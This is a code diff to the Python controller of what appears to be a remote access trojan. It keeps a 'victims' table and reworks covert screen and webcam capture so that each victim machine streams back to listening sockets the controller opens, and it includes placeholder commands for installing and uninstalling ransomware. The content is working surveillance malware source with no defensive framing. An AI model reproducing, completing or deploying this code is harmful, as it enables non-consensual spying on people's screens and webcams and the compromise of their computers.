@@ -2,8 +2,8 @@ import socket
 import threading
 from host_constants import *
 import tkinter as tk
-import ScreenSharing.client.client as screenSharingClient
-import WebCamSharing.client.client as webCamSharingClient
+import ScreenSharing.watcher.watcher as scWatcher
+import WebCamSharing.watcher.watcher as wcWatcher
 
 victims = {}
 
@@ -37,20 +37,37 @@ def processCommand(command, selectedVictim):
     print("Command has been sent!")
 
     if command ==  WATCH_SCREEN_COMMAND:
-        ip, port = victims[selectedVictim].recv(1024).decode().split(' ')
-        port = int(port)
-        threading.Thread(target=screenSharingClient.main, args=(ip, port)).start()
+        victims[selectedVictim].send(f'{HOST_IP} {HOST_SCREENSHARE_PORT}'.encode())
+        threading.Thread(target= handleScreenSharing).start()
 
     elif command ==  WATCH_WEBCAM_COMMAND:
-        ip, port = victims[selectedVictim].recv(1024).decode().split(' ')
-        port = int(port)
-        threading.Thread(target=webCamSharingClient.main, args=(ip, port)).start()
+        victims[selectedVictim].send(f'{HOST_IP} {HOST_WEB_CAM_SHARE_PORT}'.encode())
+        threading.Thread(target= handleWebCameraSharing).start()
 
     elif command ==  INSTALL_RANSOMWARE_COMMAND:
         pass
 
     elif command ==  UNINSTALL_RANSOMWARE_COMMAND:
         pass
+
+
+def handleScreenSharing():
+    screenShareSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    screenShareSoc.bind((HOST_IP, HOST_SCREENSHARE_PORT))
+
+    screenShareSoc.listen(1)
+    sharerSocket, _ =  screenShareSoc.accept() 
+
+    scWatcher.watchScreen(sharerSocket)
+
+def handleWebCameraSharing():
+    webCameraShareSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    webCameraShareSoc.bind((HOST_IP, HOST_WEB_CAM_SHARE_PORT))
+
+    webCameraShareSoc.listen(1)
+    sharerSocket, _ =  webCameraShareSoc.accept() 
+
+    wcWatcher.watchWebCam(sharerSocket)
 
 
 def sendCommand(command, victimSoc):
